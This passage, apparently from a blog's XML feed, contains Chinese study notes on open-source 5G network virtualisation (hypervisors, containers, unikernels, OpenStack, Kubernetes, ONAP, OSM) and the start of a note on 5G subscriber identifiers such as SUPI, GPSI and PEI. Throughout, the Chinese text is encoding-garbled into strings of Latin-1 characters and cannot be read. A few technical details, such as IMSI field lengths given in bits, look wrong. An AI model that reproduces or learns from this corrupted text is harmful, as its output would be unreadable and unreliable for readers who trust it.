ç¶“ç”±ç‰¹å®šçš„æ‹“æ¨¸ä¾†é€£æ¥åœ¨ä¸€èµ·ï¼Œä¾†ç®¡ç†å®ƒå€‘çš„ç”Ÿå‘½é€±æœŸã€‚</p><p>æ ¹æ“š ETSIæ¶æ§‹:<br>ä¸€å€‹NFV Orchestrator ç”±ä¸‹åˆ—çµ„æˆ:</p><ol><li>ä¸€å€‹ç®¡ç†è™›æ“¬åŒ–åŸºç¤è¨­æ–½(e.g. VIM(Virtualization Infra. Manager)æ¡†æ¶ï¼Œä¾‹å¦‚OpenStack,Kubernetes,Dockerç­‰)çš„å­ç³»çµ±ä»¥åŠèˆ‡ç‰©ç†ç¡¬é«”çš„é€£æ¥</li><li>ä¸€å€‹å¯¦éš›çš„MANOæ¡†æ¶</li><li>å®ƒæ‰€ç®¡ç†çš„VNFsçš„é›†åˆ<br>é€™äº›æ¡†æ¶æœ‰è‘—Northboundã€Southbound APIä¾†èˆ‡å…¶å®ƒèœ‚çª©ç¶²è·¯çµ„ä»¶äº’å‹•<br>æœ¬ç« å°‡æœƒè¨è«–è™›æ“¬åŒ–æŠ€è¡“ã€VIMsï¼Œè¨è«–å—æ­¡è¿çš„ MANOæ¡†æ¶åƒæ˜¯ONAPã€OSMã€Open Baton</li></ol><h2 id="Virtualization-techniques"><a href="#Virtualization-techniques" class="headerlink" title="Virtualization techniques"></a>Virtualization techniques</h2><p>NFVå°‡éƒ¨ç½²åœ¨ç¶²è·¯ä¸­çš„æœå‹™èˆ‡å…¶é‹è¡Œçš„ç¡¬é«”åŸºç¤è¨­æ–½åˆ†é›¢ï¼Œè€Œæ‡‰ç”¨ç¨‹å¼éƒ½è¢«åŒ…é€²èˆ‡ç¡¬é«”åˆ†éš”è™›æ“¬æ©Ÿä¸­ï¼ŒNFVæ¶ˆé™¤äº†å°æ¯å€‹NFå°ç‰¹å®šç¡¬é«”çš„éœ€æ±‚ï¼Œå¯¦ç¾ç¶²è·¯çš„å¯æ“´å¢æ€§</p><p><img src="https://i.imgur.com/QBfrv68.png"><br><em>æ­¤åœ–ç‚ºNFVçš„é«˜éšæ¶æ§‹åœ–ï¼Œä¸¦å±•ç¤ºå¤šç¨®å¯¦ç¾æ–¹å¼</em></p><h2 id="Traditional-Virtual-Machine"><a href="#Traditional-Virtual-Machine" class="headerlink" title="Traditional Virtual Machine"></a>Traditional Virtual Machine</h2><p>ç¡¬é«”å±¤ç´šè™›æ“¬åŒ–ã€æä¾›æ©Ÿå™¨ç¯€ç´šåˆ¥çš„éš”é›¢ï¼Œé€éguest OSèˆ‡kernelä¾†æ¨¡æ“¬é›»è…¦ç³»çµ±<br>ç”±æ–¼VNFæœ‰è¨±å¤šç¡¬é«”è™›æ“¬åŒ–è¦æ±‚ï¼Œå› æ­¤å‚³çµ±VMè¢«èªç‚ºæ˜¯ä¸€ç¨®è³‡æºå¯†é›†å‹çš„ä½œæ³•</p><h2 id="Bare-metal-hypervisors"><a href="#Bare-metal-hypervisors" class="headerlink" title="Bare-metal hypervisors"></a>Bare-metal hypervisors</h2><p>bare-metal hypervisor VMåšæ³•èˆ‡å‚³çµ±VMåšæ³•ç›¸è¿‘ï¼Œä½†é€™ç¨®åšæ³•æ˜¯Hypervisorç›´æ¥runåœ¨ä¸»æ©Ÿçš„ç¡¬é«”ä¸Šè€Œä¸éœ€è¦ä¸»æ©Ÿçš„ä½œæ¥­ç³»çµ±ï¼Œä¹Ÿå¯ç”¨æ–¼ç®¡ç†+é‹è¡Œå®¹å™¨æˆ–unikernelï¼Œè€Œä¸æ˜¯æ•´å€‹è™›æ“¬æ©Ÿ</p><h2 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h2><p>æ‰“åŒ…ç‰¹å®šç¨‹å¼ä»¥åŠå®ƒçš„dependenciesï¼Œä»¥è™›æ“¬åŒ–çš„æ–¹å¼ä¾†runæ‡‰ç”¨ç¨‹å¼å’Œæœå‹™çš„è™›æ“¬ç’°å¢ƒ<br>å®¹å™¨é–“å½¼æ­¤åˆ†éš”ï¼Œä¸¦å…±äº«host OSä»¥åŠå°kernelçš„å­˜å–ï¼Œæ¯”èµ·VMï¼Œä¸éœ€è¦å°‡åº•éƒ¨ç¡¬é«”è™›æ“¬åŒ–ï¼Œç›¸æ¯”ä¾†èªªè¼•ä¾¿è¨±å¤šï¼Œè€Œå®¹å™¨å¯è¢«é€éèˆ‡Host OSç›¸æ¥çš„<strong>å®¹å™¨ç®¡ç†å“¡(container manager)</strong> ä¾†ç¶­è­·<br>æˆ–é€éHypervisoerç›´æ¥è·‘åœ¨è£¸æ©ŸHostæ©Ÿå™¨ä¸­</p><p>é–‹æºå®¹å™¨ç³»çµ±:</p><ul><li><strong>LXC</strong>: ç¾ä»£å®¹å™¨çš„ä¸»è¦å¯¦è¸è¾¦æ³•ï¼Œé€écgroupèˆ‡namespaceséš”é›¢ä»¥å‰µé€ æœ‰ç¨ç«‹ç¶²è·¯å’Œprocessç©ºé–“çš„è™›æ“¬ç’°å¢ƒ</li><li><strong>Docker</strong>: å…è¨±å‰µé€ å®¹å™¨ï¼Œä½¿ç”¨OSç´šåˆ¥çš„è™›æ“¬åŒ–ä¾†å°‡ä»–å€‘éƒ¨å±¬åœ¨æ©Ÿå™¨ä¸Šï¼Œèˆ‡lxcä¸åŒé»å®ƒå°‡æœå‹™ã€æ‡‰ç”¨ã€ä¾è³´é …åˆ†è§£æˆæ¯å€‹å®¹å™¨å…§çš„æ¨¡çµ„åŒ–çš„å–®å…ƒè·Ÿåˆ†å±¤ï¼Œè€Œé€™äº›åˆ†å±¤å¯å¤šå€‹å®¹å™¨å…±äº«ï¼Œå¢åŠ å®¹å™¨æ˜ åƒæª”çš„æ•ˆç‡ã€‚</li></ul><h3 id="Unikernels"><a href="#Unikernels" class="headerlink" title="Unikernels"></a>Unikernels</h3><p>Unikelsæ˜¯å¾®å°ã€è¼•é‡ï¼Œç‰¹è£½çš„imageï¼Œå”¯ä¸€ç›®çš„æ˜¯ç‚ºäº†runç‰¹å®šçš„æ‡‰ç”¨ç¨‹å¼ï¼Œä»–å€‘æœƒå°‡æ‡‰ç”¨æœå‹™å’Œå…¶ä¾è³´ç·¨è­¯æˆå¯åŸ·è¡Œçš„è™›æ“¬æ˜ åƒæª”ï¼Œéç¨‹ä¸­ä¸æœƒå»åŒ…å«ä¸å¿…è¦çš„çµ„ä»¶ï¼Œå› æ­¤unikernelèƒ½æ¯”èµ·å‚³çµ±å®¹å™¨å’ŒVMé”åˆ°æ›´å¥½çš„æ•ˆèƒ½ï¼›å› ç‚ºunikernelåªæœƒåŒ…å«é‹è¡Œç›®æ¨™æ‡‰ç”¨æ‰€å¿…éœ€çš„è»Ÿé«”å…ƒä»¶å› æ­¤æš´éœ²äº†æ¯”è¼ƒå°‘å¯èƒ½è¢«æƒ¡æ„æ”»æ“Šçš„åŠŸèƒ½ï¼Œä¾†æé«˜ç³»çµ±çš„å®‰å…¨æ€§ã€‚</p><p>ç›®å‰å·²çŸ¥Unikernelç³»çµ±: <strong>ClickOS</strong>, <strong>IncludeOS</strong>, <strong>OSv</strong>,<strong>MirageOS</strong>, <strong>Unik</strong></p><p>èœ‚çª©ç¶²è·¯ç›¸é—œçš„Unikernelæ‡‰ç”¨å¦‚ä¸‹:(è«–æ–‡)</p><ul><li>æ•´åˆAndroidçš„å‡½å¼åº«åˆ°OSvä»¥é™ä½MCC(Mobile Cloud Computer),MFC(Mobile Fog Computing)è¡Œå‹•é‹ç®—è² æ“”</li><li>åŸºæ–¼unikernelçš„5Gç¶²è·¯CDNï¼Œå¦‚ClickOS,OSv,MirageOS</li><li>å…¶ä¸­ä¸€ç¯‡è«–æ–‡å°5gæ‡‰ç”¨å¯¦ä¾‹åŒ–ç‚º VNFçš„IncludeOS unikernelå’ŒDockeråšæ•ˆèƒ½æ¯”è¼ƒ</li></ul><h2 id="Hypervisors"><a href="#Hypervisors" class="headerlink" title="Hypervisors"></a>Hypervisors</h2><p>æ˜¯ä¸€å¥—è»Ÿé«”ç”¨ä¾†è·‘è™›æ“¬æ©Ÿ(guest machines)åœ¨å¯¦é«”æ©Ÿå™¨ä¸Šçš„(Host Machine)<br>Hypervisorçš„çš„é—œéµä»»å‹™æ˜¯</p><ol><li>åœ¨ä¸»å®¢é«”æ©Ÿå™¨é–“æä¾›è™›æ“¬åŒ–</li><li>ç®¡ç†å®¢é«”æ©Ÿå™¨è³‡æºçš„åˆ†é…èˆ‡é‡æ–°åˆ†é…(CPU,Memory,Storage)</li><li>ä¸»å®¢é«”æ©Ÿå™¨ä¹‹é–“çš„è³‡æºèª¿åº¦</li></ol><p>æœ‰å…©ç¨®é¡åˆ¥çš„Hypervisor: Type1 ,Type2<br><strong>Type 1 :</strong>  Hypervioserç›´æ¥è·‘åœ¨è£¸æ©Ÿ(bare-metal)hostæ©Ÿå™¨ä¸Šï¼Œä¸¦åœ¨hostä¸Šä½œç‚ºOS<br>Example: Xen, Vmware ESXi<br><strong>Type 2 :</strong>  ä½œç‚ºè»Ÿé«”å±¤è·‘åœ¨host OSä¸Š<br>Example: Linux Kernel-based VM (KVM),BSD bhyve, Oracle Virtual Box</p><h3 id="Virtualization-infrastrucutre-managers-VIM"><a href="#Virtualization-infrastrucutre-managers-VIM" class="headerlink" title="Virtualization infrastrucutre managers(VIM)"></a>Virtualization infrastrucutre managers(VIM)</h3><p>VIMè² è²¬æ§åˆ¶èˆ‡ç®¡ç†NFVåŸºç¤è¨­æ–½æ¶æ§‹å’Œå…¶è³‡æºï¼Œåƒæ˜¯å„²å­˜ã€è¨ˆç®—ã€ç¶²è·¯è³‡æºã€ä¸¦åœ¨Hostç¡¬é«”ä¸Šå”èª¿å®¢é«”æ©Ÿå™¨çš„å¯¦ä¾‹åŒ–ã€‚<strong>VIMå±¬æ–¼MANOæ¡†æ¶çš„ä¸€éƒ¨åˆ†</strong>ï¼Œæ¡†æ¶éƒ¨åˆ†å‰é¢æéäº†</p><p>VIMsçš„ç¯„ä¾‹æœ‰: <strong>OpenStack</strong>ã€<strong>Kubernetes</strong></p><ul><li><strong>OpenStack</strong>: ä¸€å€‹é›²ç«¯è¨ˆç®—å¹³å°ï¼Œèƒ½å¤ æ§åˆ¶å¤§é‡ç•°æ§‹(heterogeneous)è³‡æºï¼Œåƒæ˜¯è¨ˆç®—ã€å„²å­˜ã€ç¶²è·¯è³‡æºç­‰ã€‚åœ¨å®ƒçš„çœ¾å¤šåŠŸèƒ½ä¹‹ä¸­ï¼Œå®ƒå¯åƒæ˜¯VIMä¸€æ¨£ï¼Œç®¡ç†ç¶²è·¯åŸºç¤è¨­æ–½ã€è™›æ“¬æ©Ÿã€å®¹å™¨ã€unikernelã€VNFæœå‹™å’Œæ‡‰ç”¨</li><li><strong>Kubernetes</strong>: æä¾›è‡ªå‹•åŒ–éƒ¨å±¬ã€æ“´å……ã€ç®¡ç†VMã€å®¹å™¨ã€unikernelã€å’Œå…¶æ‡‰ç”¨ï¼›é€éä¸€ç³»åˆ—çš„ç‰©ä»¶ä¾†æŠ½è±¡åŒ–å’Œè¡¨é”ç³»çµ±çš„ç‹€æ…‹ï¼Œé€™äº›æŒä¹…æ€§å¯¦é«”æè¿°äº†åœ¨K8Sç®¡ç†çš„clusterä¸Šè·‘çš„VNFå’Œæ‡‰ç”¨ç¨‹å¼ã€å®ƒå€‘çš„å¯ç”¨è³‡æºä»¥åŠæœ‰é—œå…¶é æœŸè¡Œç‚ºçš„ç­–ç•¥ã€‚<br>  ç¶“éæ•¸å¹´ä¹Ÿæœ‰æ•¸å€‹èˆ‡k8säº’å‹•ä¾†è™•ç†å”å®šå±¤Layer2,Layer3è¤‡é›œå•é¡Œçš„å°ˆæ¡ˆï¼Œåƒæ˜¯<strong>Istio</strong>ã€<strong>NSM(Network Service Mesh)</strong> ç­‰<ul><li>Istio mesh service: å¯¦ä½œæµé‡ç®¡ç†ã€ç­–ç•¥åŸ·è¡Œã€å’Œé™æ¸¬æ”¶é›†(telemetry collection)ç­‰ä»»å‹™</li><li>NSM:NSMé€éKubernetes APIä»¥æ”¯æ´é€²éšä½¿ç”¨æ¡ˆä¾‹ä¸¦ä¿ƒé€²æ¡ç”¨æ–°çš„cloud nativeæ–¹æ¡ˆï¼Œä¸¦ä¸”å®ƒä¹Ÿèƒ½å¤ å…è¨±ç¶²è·¯ç®¡ç†å“¡åŸ·è¡Œç„¡ç¸«åŸ·è¡Œä»»å‹™ï¼Œåƒæ˜¯è«‹æ±‚ç¶²è·¯ä»‹é¢ã€æ·»åŠ ç„¡ç·šé›»æœå‹™ç­‰ç­‰</li></ul></li></ul><h2 id="The-Open-Network-Automation-Platform"><a href="#The-Open-Network-Automation-Platform" class="headerlink" title="The Open Network Automation Platform"></a>The Open Network Automation Platform</h2><p>ä¸»è¦æ˜¯ç”±Linux Foundationé–‹ç™¼çš„ä¸€å¥—NFVæ¡†æ¶ï¼Œæœ‰è¨±å¤šæ”¯æ´çš„ç‡Ÿé‹å•†ã€‚<br>OANè¢«éƒ¨å±¬åœ¨å¤šå€‹å•†æ¥­èœ‚çª©ç¶²è·¯ä¹‹ä¸­ï¼Œå…¶å» å•†åƒæ˜¯Ericsson,Nokia,Huawai,ZTEé€™äº›å…¬å¸ï¼Œä»–å€‘æä¾›ONAPæ”¯æ´ä¸¦æ•´åˆé€²ä»–å€‘çš„ç”¢å“ã€‚</p><p>ONAPå°æ–¼å•†æ¥­èœ‚çª©ç¶²è·¯ä¸­æœ€è®šçš„åŸºæ–¼è»Ÿé«”çš„è§£æ±ºæ–¹å¼ã€‚<br>ONAPè² è²¬è™•ç†å¤§é‡ç¶²è·¯æœå‹™çš„è¨­è¨ˆã€å‰µé€ å’Œç”Ÿå‘½é€±æœŸç®¡ç†</p><p>ç¶²è·¯ç‡Ÿé‹å•†å¯ç”¨ONAPç·¨æ’éƒ¨å±¬åœ¨ä»–å€‘ç¶²è·¯ä¸­çš„PNFèˆ‡VNFã€‚é™¤äº†NFV orchestratorå…±åŒæ“æœ‰çš„åŠŸèƒ½(å°æ–¼è™›æ“¬åŸºç¤è¨­æ–½æˆ–ç¶²è·¯æœå‹™ä½¿ç”¨è‡ªå‹•åŒ–ä¸”åŸºæ–¼policyçš„ç®¡ç†)ï¼ŒONAPé‚„æä¾›ä¸€å€‹<strong>è¨­è¨ˆæ¡†æ¶</strong>ä¾†æ¨¡æ“¬ç¶²è·¯æ‡‰ç”¨å’Œæœå‹™ï¼Œä»¥ä¸€å€‹<strong>è³‡æ–™åˆ†ææ¡†æ¶</strong>ä¾†ç›£æ§æœå‹™çš„ä¿®å¾©å’Œæ“´å¢</p><p>ONAPé‚„æä¾›äº†è¨±å¤šçš„åƒè€ƒè¨­è¨ˆ(i.e. blueprint)ï¼Œå¯ç”¨ä¾†ç‚ºç‰¹å®šå ´æ™¯(5G Networks,VoLTEâ€¦etc)éƒ¨å±¬éƒ¨å±¬ONAPæ¶æ§‹ï¼Œ</p><p><img src="https://i.imgur.com/gaDoMDa.png"></p><p>ONAPæ¶æ§‹çš„ä¸»è¦components:</p><ul><li><strong>Management Framework:</strong> åˆè¢«ç¨±ç‚º<strong>OOM</strong> (ONAP Operations Manager)ï¼Œè² è²¬ç·¨æ’èˆ‡ç›£æ§ONAPçµ„ä»¶çš„ç”Ÿå‘½é€±æœŸï¼ŒOOMåˆ©ç”¨K8Så’Œ<strong>Consul</strong>ä¾†æ”¯æ´æœå‹™æ§åˆ¶ã€ç™¼ç¾ã€è¨­å®šå’Œåˆ†æ®µã€‚åœ¨å®ƒçš„åŠŸèƒ½ä¸­æœ€å€¼å¾—æ³¨æ„çš„æ˜¯<ul><li>Component deployment,dependency manager and configuration</li><li>real-time health monitoring</li><li>service clusteromg and scaling</li><li>component upgrade,restart and deletion</li></ul></li><li><strong>Design Framework</strong>: <ul><li>å…è¨±ä½¿ç”¨å®£å‘Šå¼çš„<strong>æ¨¡å‹èªè¨€</strong> ä¾†å»ºç«‹ç¶²è·¯æœå‹™ï¼Œä½¿å¾—å¯ä»¥æŒ‡å®šæ¯å€‹æœå‹™çš„è¦æ±‚å’ŒåŠŸèƒ½ã€‚</li><li>å®ƒå…è¨±é€šéä¸€çµ„é€šç”¨è¦ç¯„å’Œç­–ç•¥ä¾†å°è³‡æºã€æœå‹™ã€ç”¢å“åŠå…¶ç®¡ç†å’Œæ§åˆ¶åŠŸèƒ½é€²è¡Œ<strong>å»ºæ¨¡</strong>ã€‚</li><li>å®ƒé‚„åŒ…æ‹¬ç”¨æ–¼ç³»çµ±è³‡ç”¢ã€æµç¨‹å’Œç­–ç•¥çš„å®šç¾©ã€æ¨¡æ“¬å’Œèªè­‰çš„æœå‹™è¨­è¨ˆå’Œå‰µå»ºæ¨¡çµ„ã€‚</li><li>æ¨¡çµ„ä¹Ÿæä¾›ç¾æœ‰æœå‹™çš„è³‡æ–™åº«å’Œç”¨æ–¼é©—è­‰ç¶²è·¯åŠŸèƒ½çš„API</li></ul></li><li><strong>Run-time Framework</strong><ul><li>ç”±è¨±å¤šè»Ÿé«”æ¡†æ¶çµ„æˆï¼Œç”¨æ–¼å¤§å¤šæ•¸çš„ç®¡ç†èˆ‡ç·¨æ’åŠŸèƒ½</li><li>ç•¶åœ¨run-timeéšæ®µï¼ŒMicorservices Buså…è¨±ç”±ONAPç®¡ç†çš„ä¸åŒç¶²è·¯åŠŸèƒ½(NF)ä¹‹é–“çš„è¨Šæ¯èˆ‡è³‡æ–™é€šè¨ŠåŠè·¯ç”±</li><li>run-timeæ¡†æ¶ä½¿ç”¨è‡ªå‹•åŒ–çš„control loopä¾†èª¿åº¦çµ‚æ­¢å¾®æœå‹™ï¼Œä¸¦å¾å¹³å°æ”¶é›†è³‡æ–™å’Œåˆ†æè³‡æ–™</li><li>run-time componentæœ‰å…¬é–‹APIã€dashboardå’Œcmdlineå·¥å…·ï¼Œé€éä¸€å€‹çµ±ä¸€çš„ä»‹é¢ä¾†æ§åˆ¶ç¶²è·¯åŸºç¤æ–½è¨­æ–½</li></ul></li></ul><p>åœ¨é€™äº›æ¡†æ¶åº•å±¤å¯ä»¥ç”¨ä¾†èˆ‡å¤–éƒ¨æ§åˆ¶å™¨ã€ä½œæ¥­ç³»çµ±ã€é›²ç«¯ç’°å¢ƒæ•´åˆï¼›nothboud APIå‰‡æä¾›çµ¦OSS&#x2F;BSSï¼Œå¤§æ•¸æ“šåŠç›¸é—œæœå‹™ã€‚</p><h2 id="Integration-with-5G-networks"><a href="#Integration-with-5G-networks" class="headerlink" title="Integration with 5G networks"></a>Integration with 5G networks</h2><p>é™¤äº†ä¸€èˆ¬çš„è¡Œå‹•ç¶²è·¯ç·¨æ’èˆ‡ç®¡ç†æ¡†æ¶ï¼ŒONAPæä¾›äº†èˆ‡5Géƒ¨å±¬ç›¸é—œçš„é‡è¦åŠŸèƒ½<br>é€šå¸¸ç‡Ÿé‹å•†çš„ä¸»è¦è¦æ±‚æœƒæ˜¯éœ€æ”¯æ´hybrid infra</p><ul><li>é ˆåŒ…å«è»Ÿç¡¬é«”è¨­å‚™</li><li>é‚Šç·£è‡ªå‹•åŒ–ï¼Œé›²é ˆåˆ†å¸ƒåœ¨åœ°ç†ä½ç½®ä¸Šä¸åŒçš„é‚Šç·£ä½ç½®</li><li>real-time åˆ†æ(é ˆä½¿ç”¨è‡ªå‹•åŒ–çš„control loop)</li></ul><p>The Frankfurt release (June 2020)èˆ‡O-RANæ•´åˆ</p><h2 id="Open-Source-NFV-Management-and-Orchestration"><a href="#Open-Source-NFV-Management-and-Orchestration" class="headerlink" title="Open Source NFV Management and Orchestration"></a>Open Source NFV Management and Orchestration</h2><p>Open Source NFV Management and Orchestration(OSM)æ˜¯ç”±ä¸€å †ç¶²è·¯ç‡Ÿé‹å•†é–‹ç™¼çš„ä¸€å€‹MANOæ¡†æ¶ã€‚<br>èˆ‡ONAPç›¸ä¼¼ï¼Œä¹Ÿè¢«é–‹ç™¼åŠéƒ¨å±¬åœ¨èœ‚çª©ç¶²è·¯ä¹‹ä¸­ã€‚</p><p><img src="https://i.imgur.com/rPRGyRL.png"><br><em>OSMçš„æ¶æ§‹åœ–</em></p><ul><li><strong>The information model</strong>:<br>  å°‡ç‚ºNF,åˆ‡ç‰‡å»ºæ¨¡ç‚ºæ¨¡æ¿ï¼Œç¨±ç‚ºpackagesï¼Œé€™æ˜¯ç”±ETSI MANOæ¡†æ¶æ‰€æä¾›çš„å®šç¾©æ˜ç¢ºçš„è³‡è¨Šæ¨¡å‹ä¾†å¯¦ç¾çš„ã€‚èˆ‡ONAPçš„design componentsé¡ä¼¼ï¼Œå®ƒä½¿é›»ä¿¡ç‡Ÿé‹å•†èƒ½å¤ åˆ†æç¶²è·¯éœ€æ±‚ï¼Œä¸¦å°éœ€è¦ç‚ºåŠŸèƒ½ã€æœå‹™ã€åˆ‡ç‰‡éƒ¨å±¬çš„è³‡æºé€²è¡Œå»ºæ¨¡ã€‚</li><li><strong>The OSM Automation Framework</strong>:<br>  å®ƒè‡ªå‹•åŒ–äº†NFçš„ç”Ÿå‘½é€±æœŸï¼Œå¾åˆå§‹åŒ–åˆ°æ“´å¢åˆ°åˆªé™¤ï¼Œè€Œé€™ç”±æ‡‰ç”¨è³‡è¨Šæ¨¡å‹åˆ°å¯¦éš›éƒ¨å±¬çš„infraä¸Š<br>  ï¼Œä¾†å®Œæˆçš„(å¯çœ‹ä¸Šåœ–)ï¼Œé€éè‡ªå‹•åŒ–æ¡†æ¶å‘ä¸åŒå»ºæ¨¡çµ„ä»¶å…¬é–‹northbound interface</li></ul><p>èˆ‡ONAPä¸€æ¨£ï¼ŒOSM southbound norhtbound APIså¯å…¬é–‹çµ¦å¤–éƒ¨æœå‹™ï¼Œåƒæ˜¯å…¶ä»–ç·¨æ’å™¨å’ŒOSS&#x2F;BSSç­‰</p><h1 id="Software-defined-radio-support-for-open-source-radio-units"><a href="#Software-defined-radio-support-for-open-source-radio-units" class="headerlink" title="Software-defined radio support for open source radio units"></a>Software-defined radio support for open source radio units</h1><p>SDRè¨­å‚™<br>USRPã€BladeRFã€LimeSDRã€Iris</p><h1 id="Testbeds"><a href="#Testbeds" class="headerlink" title="Testbeds"></a>Testbeds</h1><p>ä»‹ç´¹é–‹æºæ‡‰ç”¨ã€æ¡†æ¶ã€ç¡¬é«”å…ƒä»¶ç”¨ä¾†å¯¦ä¾‹åŒ–åŠè»Ÿé«”åŒ–5Gç¶²è·¯çš„æ¸¬è©¦å¹³å°</p><p><img src="https://i.imgur.com/QvOZnqY.png"></p><h1 id="Softwarized-5G-Limitations-and-road-ahead"><a href="#Softwarized-5G-Limitations-and-road-ahead" class="headerlink" title="Softwarized 5G: Limitations and road ahead"></a>Softwarized 5G: Limitations and road ahead</h1><ul><li>Keep pace with the standards</li><li>Latency and scalability issues.</li><li>Limited contributions for RAN open source software</li></ul><div class="note info flat"><p>è«–æ–‡é€£çµ: <a href="https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf">https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf</a></p></div>]]></content>
      
      
      <categories>
          
          <category> è«–æ–‡å°è®€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> O-RAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ§ªç­†è¨˜- 5G æ ¸å¿ƒç¶²è·¯-ç§»å‹•æ€§ç®¡ç†(Mobile Management)</title>
      <link href="/posts/a05f1769.html"/>
      <url>/posts/a05f1769.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç”¨æˆ¶æ¨™èªŒèˆ‡ä½ç½®æ¨™èªŒ"><a href="#ç”¨æˆ¶æ¨™èªŒèˆ‡ä½ç½®æ¨™èªŒ" class="headerlink" title="ç”¨æˆ¶æ¨™èªŒèˆ‡ä½ç½®æ¨™èªŒ"></a>ç”¨æˆ¶æ¨™èªŒèˆ‡ä½ç½®æ¨™èªŒ</h2><p>ç”¨æˆ¶æ¨™èªŒåˆ†ç‚ºæ°¸ä¹…æ¨™èªŒèˆ‡éæ°¸ä¹…æ¨™èªŒå…©ç¨®:</p><ul><li><p><strong>æ°¸ä¹…æ¨™èªŒ</strong><br>  ä¸€æ—¦ç”¨æˆ¶ç¶å®šä¾¿ä¸æœƒä¿®æ”¹ï¼Œå…·å‚™ä¸€å®šç¨‹åº¦çš„éš±ç§æ€§</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SUPI</span><br><span class="line">2. é€šç”¨å…¬å…±è¨‚é–±æ¨™èªŒ(GPSI)</span><br><span class="line">3. æ°¸ä¹…è¨­å‚™æ¨™èªŒ(PEI)</span><br></pre></td></tr></table></figure></li><li><p><strong>éæ°¸ä¹…æ¨™èªŒ</strong><br>  ç”¨æ–¼è‡¨æ™‚æ¨™ç¤ºç”¨æˆ¶ï¼Œ3GPPæœƒä¸å®šæœŸæ›´æ¨™ç¤ºç¬¦è™Ÿ</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 5G å…¨çƒè‡¨æ™‚çµ±ä¸€æ¨™ç¤ºç¬¦(5G-GUTI)</span><br><span class="line">2. SUCI</span><br></pre></td></tr></table></figure><p>ä½ç½®æ¨™èªŒåŒ…å«<strong>å°å€ä½ç½®è·Ÿè¹¤æ¨™èªŒ(TAI)<strong>ã€</strong>è·Ÿè¹¤å€ç·¨ç¢¼(TAC)</strong></p></li></ul><h3 id="SUPI"><a href="#SUPI" class="headerlink" title="SUPI"></a>SUPI</h3><p>SUPIç‚ºæ°¸ä¹…æ¨™èªŒï¼Œ5Gç³»çµ±ä¸­æ¯å€‹ç°½ç´„çš„ç”¨æˆ¶éƒ½æœƒè¢«åˆ†é…åˆ°ä¸€å€‹5G SUPIï¼Œç”¨æ–¼<strong>åœ¨3GPPç³»çµ±ä¸­</strong>æ¨™ç¤ºè©²ç°½ç´„ç”¨æˆ¶<br>SUPIæ¨™èªŒå­˜æ–¼<strong>UDM&#x2F;UDR(ä¸€ç¨®NF)</strong> ä¹‹ä¸­ï¼ŒåŠŸèƒ½é¡ä¼¼4Gçš„IMSIã€‚<br>SUPIå¯åŒ…å«IMSIè¨Šæ¯æˆ–æ˜¯ç”¨æ–¼ç§æœ‰ç¶²è·¯çš„ç‰¹å®šç¶²è·¯æ¨™èªŒ(network-specific identifier)</p><p>IMSIæ ¼å¼:</p><table><thead><tr><th>å°åŒ…</th><th>MCC</th><th>MNC</th><th>MSIN</th></tr></thead><tbody><tr><td>é•·åº¦</td><td>3bit</td><td>2~3bit</td><td>&lt;&#x3D;10bit</td></tr><tr><td></td><td>PLMN</td><td>PLMN</td><td></td></tr></tbody></table><ul><li>In æ¼«éŠå ´æ™¯: SUPIéœ€è¦æ”œå¸¶æ‰€æ­¸å±¬ç¶²è·¯çš„åœ°å€è³‡è¨Š:MNCã€MCC</li><li>è‹¥èˆ‡ EPC Networkäº’é€š: SUPIç¸½æ˜¯åŸºæ–¼IMSI</li></ul><h3 id="é€šç”¨å…¬å…±è¨‚é–±æ¨™èªŒ-GPSI"><a href="#é€šç”¨å…¬å…±è¨‚é–±æ¨™èªŒ-GPSI" class="headerlink" title="é€šç”¨å…¬å…±è¨‚é–±æ¨™èªŒ (GPSI)"></a>é€šç”¨å…¬å…±è¨‚é–±æ¨™èªŒ (GPSI)</h3><p>GPSIç‚ºæ°¸ä¹…æ¨™èªŒï¼Œ<strong>ç”¨æ–¼åœ¨é3GPPç¶²è·¯ä¹‹ä¸­ä¾†æ¨™ç¤ºä¸€å€‹3GPPçš„ç°½ç´„</strong><br>GPSIèˆ‡3GPPçš„å°æ‡‰é—œä¿‚æœƒå„²å­˜åœ¨ç°½ç´„è³‡æ–™ä¸­ï¼›GPSIåœ¨ç³»çµ±å…§éƒ¨èˆ‡å¤–éƒ¨éƒ½å¯ä½œç‚ºå…¬å…±æ¨™èªŒã€‚<br>GPSIå¯ä»¥æ˜¯<strong>MSISDN</strong>æˆ–å…¶ä»–å¤–éƒ¨æ¨™èªŒ</p><h3 id="æ°¸ä¹…è¨­å‚™æ¨™èªŒ-PEI"><a href="#æ°¸ä¹…è¨­å‚™æ¨™èªŒ-PEI" class="headerlink" title="æ°¸ä¹…è¨­å‚™æ¨™èªŒ(PEI)"></a>æ°¸ä¹…è¨­å‚™æ¨™èªŒ(PEI)</h3><p>PEIç‚ºæ°¸ä¹…æ¨™èªŒï¼Œ<strong>é‡å°å­˜å–5Gç¶²è·¯çš„3GPP UEçš„æ¨™èªŒ</strong><br>ä¸åŒé¡å‹çš„UEå’Œä¸åŒä½¿ç”¨å ´æ™¯ï¼ŒPEIå¯èƒ½æœƒæœ‰ä¸åŒæ ¼å¼<br>UEå¯åœ¨ç™¼é€PEIçš„åŒæ™‚ï¼Œæ”œå¸¶å°æ‡‰ è©²PEIæ‰€ä½¿ç”¨æ ¼å¼çš„æŒ‡ä»¤è¨Šæ¯<br>è‹¥UEæ”¯æ´è‡³å°‘ä¸€ç¨®3GPPå­˜å–æŠ€è¡“ï¼Œå‰‡UEçš„PEIç³»éœ€ä½¿ç”¨IMEIæˆ–IMEISVæ ¼å¼</p><h3 id="5G-å…¨çƒè‡¨æ™‚çµ±ä¸€æ¨™ç¤ºç¬¦-5G-GUTI"><a href="#5G-å…¨çƒè‡¨æ™‚çµ±ä¸€æ¨™ç¤ºç¬¦-5G-GUTI" class="headerlink" title="5G å…¨çƒè‡¨æ™‚çµ±ä¸€æ¨™ç¤ºç¬¦(5G-GUTI)"></a>5G 